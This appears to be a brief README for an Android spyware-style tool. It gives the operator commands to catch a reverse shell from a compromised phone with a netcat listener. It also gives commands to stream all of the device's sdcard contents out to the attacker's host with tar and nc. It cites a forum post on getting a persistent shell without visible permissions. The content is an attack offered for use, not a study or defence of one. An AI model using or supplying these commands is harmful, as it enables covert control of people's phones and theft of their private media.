# How to use it simple way

## Get reverse shell
In server (10.7.2.108):

```bash
netcat -nlvp 4444
```

Now you will have the reverse shell.

## Download media files
Firstly you open a listening port for the tar file (inside a safe folder which will hold all info):

```bash

nc -l -p 7000 | tar -x
```

In the reverse shell you do the following to start the process of transfering all files:

```bash
cd sdcard
tar -c * | nc 10.7.2.108 7000
```

### Disclaimer

It uses new manifest permission request method (Video, images and audio separated)

Ref: [Mobile-Hacker Forum](https://www.mobile-hacker.com/2023/09/27/get-persistent-reverse-shell-from-android-app-without-visible-permissions-to-make-device-unusable/)